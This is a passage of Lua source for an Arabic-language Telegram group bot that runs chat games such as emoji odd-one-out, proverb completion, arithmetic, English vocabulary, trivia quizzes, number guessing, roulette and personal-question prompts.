name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
name = string.gsub(name,'🐇','🕊🕊🕊🕊🕊🐇🕊🕊')
name = string.gsub(name,'🌑','🌚🌚🌚🌚🌚🌑🌚🌚')
name = string.gsub(name,'🌚','🌑🌑🌑🌑🌑🌚🌑🌑')
name = string.gsub(name,'⭐️','🌟🌟🌟🌟🌟🌟⭐️🌟')
name = string.gsub(name,'📥','💫💫💫📥💫💫💫💫')
name = string.gsub(name,'⛈','🌨🌨🌨⛈🌨🌨🌨🌨')
name = string.gsub(name,'🌥','⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️')
name = string.gsub(name,'⛄️','☃️☃️☃️☃️⛄️☃️☃️☃️☃️')
name = string.gsub(name,'👨‍🔬','👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬')
name = string.gsub(name,'👨‍💻','👩‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻👩‍💻👩‍💻')
name = string.gsub(name,'👨‍🔧','👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧')
name = string.gsub(name,'👩‍🍳','👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳')
name = string.gsub(name,'🧚‍♀️','🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♀️🧚‍♂️🧚‍♂️')
name = string.gsub(name,'🧚‍♂️','🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♂️🧚‍♀️🧚‍♀️')
name = string.gsub(name,'🧝‍♂️','🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♂️🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♀️')
name = string.gsub(name,'🙍‍♂️','🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️')
name = string.gsub(name,'🧖‍♂️','🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️')
name = string.gsub(name,'👬','👭👭👭👭👬👭👭👭')
name = string.gsub(name,'👨‍👨‍👧','👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦')
name = string.gsub(name,'🕓','🕒🕒🕒🕒🕓🕒🕒🕒')
name = string.gsub(name,'🕤','🕥🕥🕥🕥🕥🕤🕥🕥')
name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⌛️⏳⏳')
name = string.gsub(name,'📅','📆📆📆📆📆📅📆📆')
name = string.gsub(name,'👩‍⚖️','👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👩‍⚖️👨‍⚖️👨‍⚖️')
name = string.gsub(name,'👨‍🎨','👩‍🎨👩‍🎨👨‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨')
BlAcKTeam = '᥀︙اول واحد يطلع المختلف يربح\n{'..name..'} '
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md')
return false
end end
if text == DevJoker:get(BlAcK..'Joker:GameNum4'..msg.chat_id_) and not DevJoker:get(BlAcK..'Joker:Games:Ids'..msg.chat_id_) then
if not DevJoker:get(BlAcK..'Joker:Games:Ids'..msg.chat_id_) then 
BlAcKTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ المختلف للعب مره اخرى'
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md')
DevJoker:incrby(BlAcK..'Joker:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevJoker:set(BlAcK..'Joker:Games:Ids'..msg.chat_id_,true)
end  
if text == 'امثله' and ChCheck(msg) or text == 'الامثله' and ChCheck(msg) or text == '↫ امثله ᥀' and ChCheck(msg) then
if not DevJoker:get(BlAcK..'Joker:Lock:Games'..msg.chat_id_) then
DevJoker2 = {
'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',
};
name = DevJoker2[math.random(#DevJoker2)]
DevJoker:set(BlAcK..'Joker:GameNum5'..msg.chat_id_,name)
DevJoker:del(BlAcK..'Joker:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'جوز','ينطي ___ للماعنده سنون')
name = string.gsub(name,'ضراطه','الي يسوق المطي يتحمل ___ ')
name = string.gsub(name,'بيدك','اكل ___ محد يفيدك')
name = string.gsub(name,'الحافي','تجدي من ___ نعال')
name = string.gsub(name,'شقره','مع الخيل يا ___ ')
name = string.gsub(name,'النخله','الطول طول ___ والعقل عقل الصخلة')
name = string.gsub(name,'سلايه','بالوجه امراية وبالظهر ___ ')
name = string.gsub(name,'الخيل','من قلة ___ شدو على الچلاب سروج')
name = string.gsub(name,'حداد','موكل من صخم وجهه كال آني ___ ')
name = string.gsub(name,'المبلل',' ___ ما يخاف من المطر')
name = string.gsub(name,'الحبل','اللي تلدغة الحية يخاف من جرة ___ ')
name = string.gsub(name,'يركص','المايعرف ___ يكول الكاع عوجه')
name = string.gsub(name,'العنب','المايلوح ___ يكول حامض')
name = string.gsub(name,'العمه','___ إذا حبت الچنة ابليس يدخل الجنة')
name = string.gsub(name,'الخبز','انطي ___ للخباز حتى لو ياكل نصه')
name = string.gsub(name,'بالحصاد','اسمة ___ ومنجله مكسور')
name = string.gsub(name,'شهر','امشي ___ ولا تعبر نهر')
name = string.gsub(name,'شكه','يامن تعب يامن ___ يا من على الحاضر لكة')
name = string.gsub(name,'القرد',' ___ بعين امه غزال')
name = string.gsub(name,'يكحله','اجه ___ عماها')
BlAcKTeam = '᥀︙اكمل المثال التالي ↫ ['..name..']'
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md')
return false
end end
if text == DevJoker:get(BlAcK..'Joker:GameNum5'..msg.chat_id_) then
if not DevJoker:get(BlAcK..'Joker:Games:Ids'..msg.chat_id_) then 
DevJoker:incrby(BlAcK..'Joker:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevJoker:del(BlAcK..'Joker:GameNum5'..msg.chat_id_)
BlAcKTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ امثله للعب مره اخرى'
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md')
end
DevJoker:set(BlAcK..'Joker:Games:Ids'..msg.chat_id_,true)
end  
if text == 'رياضيات' and ChCheck(msg) or text == 'الرياضيات' and ChCheck(msg) or text == '↫ رياضيات ᥀' and ChCheck(msg) then
if not DevJoker:get(BlAcK..'Joker:Lock:Games'..msg.chat_id_) then
DevJoker2 = {'9','46','2','9','5','4','25','10','17','15','39','5','16',};
name = DevJoker2[math.random(#DevJoker2)]
DevJoker:set(BlAcK..'Joker:GameNum6'..msg.chat_id_,name)
DevJoker:del(BlAcK..'Joker:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'9','7 + 2 = ?')
name = string.gsub(name,'46','41 + 5 = ?')
name = string.gsub(name,'2','5 - 3 = ?')
name = string.gsub(name,'9','5 + 2 + 2 = ?')
name = string.gsub(name,'5','8 - 3 = ?')
name = string.gsub(name,'4','40 ÷ 10 = ?')
name = string.gsub(name,'25','30 - 5 = ?')
name = string.gsub(name,'10','100 ÷ 10 = ?')
name = string.gsub(name,'17','10 + 5 + 2 = ?')
name = string.gsub(name,'15','25 - 10 = ?')
name = string.gsub(name,'39','44 - 5 = ?')
name = string.gsub(name,'5','12 + 1 - 8 = ?')
name = string.gsub(name,'16','16 + 16 - 16 = ?')
BlAcKTeam = '᥀︙اكمل المعادله التاليه ↫ ⤈\n{'..name..'} '
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md')
return false
end end
if text == DevJoker:get(BlAcK..'Joker:GameNum6'..msg.chat_id_) then
if not DevJoker:get(BlAcK..'Joker:Games:Ids'..msg.chat_id_) then 
DevJoker:incrby(BlAcK..'Joker:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevJoker:del(BlAcK..'Joker:GameNum6'..msg.chat_id_)
BlAcKTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ رياضيات للعب مره اخرى'
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md')
end
DevJoker:set(BlAcK..'Joker:Games:Ids'..msg.chat_id_,true)
end  
if text == 'الانكليزي' and ChCheck(msg) or text == 'الانجليزيه' and ChCheck(msg) or text == 'انكليزيه' and ChCheck(msg) or text == '↫ انكليزي ᥀' and ChCheck(msg) then
if not DevJoker:get(BlAcK..'Joker:Lock:Games'..msg.chat_id_) then
DevJoker2 = {'معلومات','قنوات','مجموعات','كتاب','تفاحه','سدني','نقود','اعلم','ذئب','تمساح','ذكي','شاطئ','غبي',};
name = DevJoker2[math.random(#DevJoker2)]
DevJoker:set(BlAcK..'Joker:GameNum7'..msg.chat_id_,name)
DevJoker:del(BlAcK..'Joker:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ذئب','Wolf')
name = string.gsub(name,'معلومات','Information')
name = string.gsub(name,'قنوات','Channels')
name = string.gsub(name,'مجموعات','Groups')
name = string.gsub(name,'كتاب','Book')
name = string.gsub(name,'تفاحه','Apple')
name = string.gsub(name,'نقود','money')
name = string.gsub(name,'اعلم','I know')
name = string.gsub(name,'تمساح','crocodile')
name = string.gsub(name,'شاطئ','Beach')
name = string.gsub(name,'غبي','Stupid')
name = string.gsub(name,'صداقه','Friendchip')
BlAcKTeam = '᥀︙ما معنى كلمة ↫ '..name
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md')
return false
end end
if text == DevJoker:get(BlAcK..'Joker:GameNum7'..msg.chat_id_) then
if not DevJoker:get(BlAcK..'Joker:Games:Ids'..msg.chat_id_) then 
DevJoker:incrby(BlAcK..'Joker:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevJoker:del(BlAcK..'Joker:GameNum7'..msg.chat_id_)
BlAcKTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ انكليزيه للعب مره اخرى'
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md')
end
DevJoker:set(BlAcK..'Joker:Games:Ids'..msg.chat_id_,true)
end  
--     Source BlAcK     --
if text == 'اسئله' and ChCheck(msg) or text == 'اختيارات' and ChCheck(msg) or text == 'الاسئله' and ChCheck(msg) or text == 'اساله' and ChCheck(msg) or text == '↫ اسئله ᥀' and ChCheck(msg) then
if not DevJoker:get(BlAcK..'Joker:Lock:Games'..msg.chat_id_) then
DevJoker2 = {'النيل','14','الفم','11','30','بوتين','ستيف جوبر','باريس','10','النمل','حرف الواو','الشعر','سحاب','الاسم','ذهب','حرف الام','العزائم','انسات','المنجنيق','اسيا','6','الاسد','مهر','الدولفين','اوروبا','الزئبق','لندن','الانسان','طوكيو','خديجه',}
name = DevJoker2[math.random(#DevJoker2)]
DevJoker:set(BlAcK..'Joker:GameNum8'..msg.chat_id_,name)
DevJoker:del(BlAcK..'Joker:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'النيل','᥀︙ماهو اطول نهر في العالم ؟\n1- النيل\n2- الفرات\n3- نهر الكونغو')
name = string.gsub(name,'14','᥀︙ماعدد عظام الوجه ؟\n1- 15\n2- 13\n3- 14')
name = string.gsub(name,'الفم','᥀︙كراسي بيضاء وجدران ورديه اذا اغلقته اصبح ظلام  فمن اكون ؟\n1- الفم\n2- الاذن\n3- الثلاجه')
name = string.gsub(name,'11','᥀︙كم جزء يحتوي مسلسل وادي الذئاب ؟\n1- 7\n2- 15\n3- 11')
name = string.gsub(name,'30','᥀︙كم جزء يحتوي القران الكريم ؟\n1- 60\n2- 70\n3- 30')
name = string.gsub(name,'بوتين','᥀︙من هوه اغنى رئيس في العالم ؟\n1- ترامب\n2- اوباما\n3- بوتين')
name = string.gsub(name,'ستيف جوبر','᥀︙من هوه مؤسس شركه ابل العالميه  ؟\n1- لاري بايج\n2- بيل جيتس\n3- ستيف جوبر')
name = string.gsub(name,'باريس','ماهي عاصمه فرنسا ؟\n1- باريس\n2- لوين\n3- موسكو')
name = string.gsub(name,'10','᥀︙ماعدد دول العربيه التي توجد في افريقيا ؟\n1- 10\n2- 17\n3- 9')
name = string.gsub(name,'النمل','᥀︙ماهو الحيوان الذي يحمل 50 فوق وزنه ؟\n1- الفيل\n2- النمل\n3- الثور')
name = string.gsub(name,'حرف الواو','᥀︙ماذا يوجد بيني وبينك ؟\n1- الضل\n2- الاخلاق\n3- حرف الواو')
name = string.gsub(name,'الشعر','᥀︙ماهو الشيء النبات ينبت للانسان بلا بذر ؟\n1- الاضافر\n2- الاسنان\n3- الشعر')
name = string.gsub(name,'سحاب','᥀︙ما هو الشّيء الذي يستطيع المشي بدون أرجل والبكاء بدون أعين ؟\n1- سحاب\n2- بئر\n3- نهر')
name = string.gsub(name,'الاسم','᥀︙ما الشيء الذي نمتلكه , لكنّ غيرنا يستعمله أكثر منّا ؟\n1- العمر\n2- ساعه\n3- الاسم')
name = string.gsub(name,'ذهب','᥀︙اصفر اللون سارق عقول اهل الكون وحارمهم لذيذ النوم ؟\n1- نحاس\n2- الماس\n3- ذهب')
name = string.gsub(name,'حرف الام','᥀︙في الليل ثلاثة لكنه في النهار واحده فما هو ؟\n1- حرف الباء\n2- حرف الام\n3- حرف الراء')
name = string.gsub(name,'العزائم','᥀︙على قدر اصل العزم تأتي ؟\n1- العزائم\n2- المكارم\n3- المبائب')
name = string.gsub(name,'انسات','᥀︙ماهي جمع كلمه انسه ؟\n1- سيدات\n2- انسات\n3- قوانص')
name = string.gsub(name,'المنجنيق','᥀︙اله اتسعلمت قديما في الحروب ؟\n1- الصاروخ\n2- المسدس\n3- المنجنيق')
name = string.gsub(name,'اسيا','᥀︙تقع لبنان في قاره ؟\n1- افريقيا\n2- اسيا\n3- امركيا الشماليه')
name = string.gsub(name,'6','᥀︙كم صفرا للمليون ؟\n1- 4\n2- 3\n3- 6')
name = string.gsub(name,'الاسد','᥀︙ماهو الحيوان الذي يلقب بملك الغابه ؟\n1- الفيل\n2- الاسد\n3- النمر')
name = string.gsub(name,'مهر','᥀︙ما اسم صغير الحصان ؟\n1- مهر\n2- جرو\n3- عجل')
name = string.gsub(name,'الدولفين','᥀︙ما الحيوان الذي ينام واحدى عينه مفتوحه ؟\n1- القرش\n2- الدولفين\n3- الثعلب\n')
name = string.gsub(name,'اوروبا','᥀︙ماهي القاره التي تلقب بالقاره العجوز ؟\n1- اوروبا\n2- امريكا الشماليه\n3- افريقيا')
name = string.gsub(name,'الزئبق','᥀︙ما اسم المعدن الموجود فيي الحاله السائله ؟\n1- النحاس\n2- الحديد\n3- الزئبق')
name = string.gsub(name,'لندن','᥀︙ماهي عاصمه انجلترا ؟\n1- لندن\n2- لفرسول\n3- تركيا')
name = string.gsub(name,'الانسان','᥀︙ماهو الشئ الذي برأسه سبع فتحات ؟\n1- الهاتف\n2- التلفاز\n3- الانسان')
name = string.gsub(name,'طوكيو','᥀︙ماهي عاصمه اليابان ؟\n1- بانكول\n2- نيو دلهي\n3- طوكيو')
name = string.gsub(name,'خديجه','᥀︙من هي زوجه الرسول الاكبر منه سنآ ؟\n1- حفضه\n2- زينب\n3- خديجه')
BlAcKTeam = name..'\n᥀︙ارسل الجواب الصحيح فقط'
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md')
return false
end end
if text == DevJoker:get(BlAcK..'Joker:GameNum8'..msg.chat_id_) then
if not DevJoker:get(BlAcK..'Joker:Games:Ids'..msg.chat_id_) then 
DevJoker:incrby(BlAcK..'Joker:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevJoker:del(BlAcK..'Joker:GameNum8'..msg.chat_id_)
BlAcKTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ الاسئله للعب مره اخرى'
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md')
end
DevJoker:set(BlAcK..'Joker:Games:Ids'..msg.chat_id_,true)
end  
--     Source BlAcK     --
if DevJoker:get(BlAcK.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
Dev_Joker(msg.chat_id_, msg.id_, 1,"᥀︙عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
return false  end 
local GETNUM = DevJoker:get(BlAcK.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevJoker:del(BlAcK..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevJoker:del(BlAcK.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
DevJoker:incrby(BlAcK..'Joker:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙*التخمين الصحيح هو* ↫ '..NUM..'\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevJoker:incrby(BlAcK..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(DevJoker:get(BlAcK..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
DevJoker:del(BlAcK..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevJoker:del(BlAcK.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙*التخمين الصحيح هو* ↫ '..GETNUM..'\n᥀︙*للاسف لقد خسرت حاول مره اخرى لتخمين الرقم الصحيح*', 1, 'md')
else
if tonumber(DevJoker:get(BlAcK..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'محاولتان فقط'
elseif tonumber(DevJoker:get(BlAcK..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
SetNum = 'محاوله واحده فقط'
end
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لقد خمنت الرقم الخطا وتبقى لديك '..SetNum..' ارسل رقم تخمنه مره اخرى للفوز', 1, 'md')
end
end
end
end
if text == 'خمن' and ChCheck(msg) or text == 'تخمين' and ChCheck(msg) or text == '↫ تخمين ᥀' and ChCheck(msg) then   
if not DevJoker:get(BlAcK..'Joker:Lock:Games'..msg.chat_id_) then
Num = math.random(1,20)
DevJoker:set(BlAcK.."GAMES:NUM"..msg.chat_id_,Num) 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙اهلا بك عزيزي في لعبة التخمين ↫ ⤈\n ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙سيتم تخمين عدد ما بين الـ1 والـ20 اذا تعتقد انك تستطيع الفوز جرب واللعب الان .\n᥀︙ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !', 1, 'md')
DevJoker:setex(BlAcK.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_, 100, true)  
return false  
end
end
--     Source BlAcK     --
if text == 'روليت' and ChCheck(msg) then
if not DevJoker:get(BlAcK..'Joker:Lock:Games'..msg.chat_id_) then
DevJoker:del(BlAcK.."Joker:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevJoker:del(BlAcK..'Joker:ListRolet'..msg.chat_id_)  
DevJoker:setex(BlAcK.."Joker:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙حسنا لنلعب , ارسل عدد اللاعبين للروليت .', 1, 'md')
return false  
end
end
if text and text:match("^(%d+)$") and DevJoker:get(BlAcK.."Joker:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
if text == "1" then
Text = "᥀︙لا استطيع بدء اللعبه بلاعب واحد فقط"
else
DevJoker:set(BlAcK.."Joker:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
Text = '᥀︙تم بدء تسجيل اللسته يرجى ارسال المعرفات \n᥀︙الفائز يحصل على 5 نقاط عدد المطلوبين ↫ '..text..' لاعب'
end
DevJoker:del(BlAcK.."Joker:StartRolet"..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,Text)
return false
end
if text and text:match('^(@[%a%d_]+)$') and DevJoker:get(BlAcK.."Joker:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
if DevJoker:sismember(BlAcK..'Joker:ListRolet'..msg.chat_id_,text) then
send(msg.chat_id_,msg.id_,'᥀︙المعرف ↫ ['..text..'] موجود اساسا')
return false
end
tdcli_function ({ID = "SearchPublicChat",username_ = text},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙المعرف غير صحيح يرجى ارسال معرف صحيح', 1, 'md')
return false 
end
DevJoker:sadd(BlAcK..'Joker:ListRolet'..msg.chat_id_,text)
local CountAdd = DevJoker:get(BlAcK.."Joker:NumRolet"..msg.chat_id_..msg.sender_user_id_)
local CountAll = DevJoker:scard(BlAcK..'Joker:ListRolet'..msg.chat_id_)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
DevJoker:del(BlAcK.."Joker:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevJoker:setex(BlAcK.."Joker:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
local Text = "᥀︙تم ادخال المعرف ↫ ["..text.."]\n᥀︙وتم اكتمال العدد الكلي هل انت مستعد ؟"
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/YesRolet"},{text="لا",callback_data="/NoRolet"}},{{text="اللاعبين",callback_data="/ListRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
local Text = "᥀︙تم ادخال المعرف ↫ ["..text.."] وتبقى ↫ "..CountUser.." لاعبين ليكتمل العدد ارسل المعرف الاخر"
keyboard = {} 
keyboard.inline_keyboard = {{{text="الغاء",callback_data="/NoRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil) 
end
--     Source BlAcK     --
if text == 'كت تويت' and ChCheck(msg) or text == 'كت' and ChCheck(msg) or text == 'تويت' and ChCheck(msg) or text == '↫ كت ᥀' and ChCheck(msg) then
if not DevJoker:get(BlAcK..'Joker:Lock:Games'..msg.chat_id_) then
local BlAcKTeam = {
'آخر مرة زرت مدينة الملاهي؟','آخر مرة أكلت أكلتك المفضّلة؟','الوضع الحالي؟\n‏1. سهران\n‏2. ضايج\n‏3. أتأمل','آخر شيء ضاع منك؟','كلمة أخيرة لشاغل البال؟','طريقتك المعتادة في التخلّص من الطاقة السلبية؟','شهر من أشهر العام له ذكرى جميلة معك؟','كلمة غريبة من لهجتك ومعناها؟🤓','‏- شيء سمعته عالق في ذهنك هاليومين؟','متى تكره الشخص الذي أمامك حتى لو كنت مِن أشد معجبينه؟','‏- أبرز صفة حسنة في صديقك المقرب؟','هل تشعر أن هنالك مَن يُحبك؟','اذا اكتشفت أن أعز أصدقائك يضمر لك السوء، موقفك الصريح؟','أجمل شيء حصل معك خلال هاليوم؟','صِف شعورك وأنت تُحب شخص يُحب غيرك؟👀💔','كلمة لشخص غالي اشتقت إليه؟💕','آخر خبر سعيد، متى وصلك؟','أنا آسف على ....؟','أوصف نفسك بكلمة؟','صريح، مشتاق؟','‏- صريح، هل سبق وخذلت أحدهم ولو عن غير قصد؟','‏- ماذا ستختار من الكلمات لتعبر لنا عن حياتك التي عشتها الى الآن؟💭','‏- فنان/ة تود لو يدعوكَ على مائدة عشاء؟😁❤','‏- تخيّل شيء قد يحدث في المستقبل؟','‏- للشباب | آخر مرة وصلك غزل من فتاة؟🌚','شخص أو صاحب عوضك ونساك مُر الحياة ما اسمه ؟','| اذا شفت حد واعجبك وعندك الجرأه انك تروح وتتعرف عليه ، مقدمة الحديث شو راح تكون ؟.','كم مره تسبح باليوم','نسبة النعاس عندك حاليًا؟','لو فقط مسموح شخص واحد تتابعه فالسناب مين بيكون ؟','يهمك ملابسك تكون ماركة ؟','وش الشيء الي تطلع حرتك فيه و زعلت ؟','عندك أخوان او خوات من الرضاعة؟','عندك معجبين ولا محد درا عنك؟','أصعب صفة قد تتواجد في الرجل .؟','كم المده الي تخليك توقع بحب الشخص؟.','تحس انك مستعد للقاء الله ولا باقي.؟','متصالح مع نفسك؟.','يسكر على أصبعك الباب ولا تعض لسانك  بالغلط؟!','عندك غمازات؟.','‏ألوانك المفضّلة؟','ردة فعلك لما تنظلم من شخص ؟','وش الحب بنظرك؟','أكثر شيء تقدره في الصداقات؟','‏لوخيروك ⁞ الاكل لو النت ؟!','عاجبك وجودك في التلي ولا تتمنى تحذفة.؟','افضل هديه ممكن تناسبك؟','شعورك الحالي في جملة؟','أنا حزين جداً أجعلني أبتسم.؟','بماذا يتعافى المرء؟','تاك لشخص نفسيه؟','شاركنا بيت شعري حزين على ذوقك.؟','اغنية عندك بيها ذكريات؟','اشياء تفتخر انك م سويتها ؟','الصراحة وقاحة ولا صدق تعامل.؟','ايهم اصدق نظرة العين او نبرة الصوت ؟','‏قلّة المال لدى الرجل في هذا الزمن يعتبرها العديد كانها عيب، مع أم ضد؟','إيهما تُفضل حُب ناجح أم صداقة دائمة.؟','على نياتكُم تُرزقون تاك لشخص ينطبق علية هذا الشيء.؟','اكثر كلمة ترفع ضغطك ؟','من أصحاب الماضي والحنين ولا الصفحات المطوية.؟','من أصحاب النسيان او التجاوز رغم الذكرى.؟','غزل بلهجتك ؟','مصروفك كم؟.','للحتيت ⁞ ماذا تفضّلين أن تكون مهنة شريك حياتك المستقبلي.؟','يومك ضاع على؟','ما الذي اسعدك اليوم .؟','كيف تتعامل مع الشخص المُتطفل ( الفضولي ) ؟','أصعب صفة قد تتواجد في المرأة.؟','مع أو ضد لو كان خيراً لبقئ.؟','نصيحة لكل شخص يذكر أحد بغيابة بالسوء.؟','كل شيء يهون الا ؟','هل أنت من النوع الذي يواجه المشاكل أو من النوع الذي يهرب ؟','كلمه لشخص خانك!؟.','تحب تحتفظ بالذكريات ؟','شاركنا أقوى بيت شِعر من تأليفك؟','‏اسرع شيء يحسّن من مزاجك؟','كلمتك التسليكيه ؟','كم ساعات نومك؟.','عندك فوبيا او خوف شديد من شيء معين ؟','موهبة تفوز بمدح الناس لك.؟','قدوتك من الأجيال السابقة؟','شخص تتمنئ له الموت؟.','عادةً تُحب النقاش الطويل أم تحب الاختصار؟','تاك لشخص نيته زباله🌚؟','صوتك حلو ؟ .','كلمتين تكررها دايم؟!','افضل روايه قريتيها؟.','متى حدث التغيير الكبير والملحوظ في شخصيتك؟','أكثر اكلهه تحبها؟.','‏كلما ازدادت ثقافة المرء ازداد بؤسه','تتفق.؟','اغبى كذبه صدقتها بطفولتك؟.','كم المده الي تخليك توقع بحب الشخص؟.','تسامح شخص وجع قلبك ؟.','ردة فعلك لما تنظلم من شخص ؟','شيء يعدل نفسيتك بثواني.؟','‏تتوقع الإنسان يحس بقرب موته؟','وقت حزنك تلجأ لمن يخفف عنك.؟','‏أكثر شيء شخصي ضاع منك؟','تزعلك الدنيا ويرضيك ؟','ما الذي يشغل بالك في الفترة الحالية؟','نهارك يصير أجمل بوجود ..؟','حسيت انك ظلمت شخص.؟','صفة يطلقها عليك من حولك بكثرة؟','‏يوم لا يمكنك نسيانه؟','أكثر اكلهه تحبها؟.','اخر كلمة قالها لك حبيبك؟.','من الشخص الاقرب لقلبك؟.','كم المده الي تخليك توقع بحب الشخص؟.','ماهي الهدية التي تتمنى أن تنتظرك يومًا أمام باب منزلك؟','‏اسم او تاك لشخص لا ترتاح في يومك إلا إذا حاجيته؟','صديق أمك ولا أبوك. ؟','لماذا الأشياء التي نريدها بشغف تأتي متأخرة؟','‏تقبل بالعودة لشخص كسر قلبك مرتين؟','افضل هديه ممكن تناسبك؟','كلمة غريبة ومعناها؟','اذا اشتقت تكابر ولا تبادر ؟.','بامكانك تنزع شعور من قلبك للابد ، ايش هو؟.','لو بتغير اسمك ايش بيكون الجديد ؟','‏شخصية لا تستطيع تقبلها؟','ما هي طريقتك في الحصول على الراحة النفسية؟','‏ايموجي يوصف مزاجك حاليًا بدقة؟','تاريخ ميلادك؟','كيف تحد الدولة من الفقر المُتزايد.؟','‏شي مستحيل يتغير فيك؟','لو اخذوك لمستشفى المخابيل كيف تثبت انت صاحي؟','إيموجي يعبّر عن مزاجك الحالي؟','وقت حزنك تلجأ لمن يخفف عنك.؟','اعترف باي حاجه ؟','شاركني آخر صورة جميلة من كاميرا هاتفك.؟','متصالح مع نفسك؟.','لو عندك امنيه وبتحقق وش هي؟.','هل انت شخص مادي.؟','أخر اتصال جاك من مين ؟','تاك لصديقك 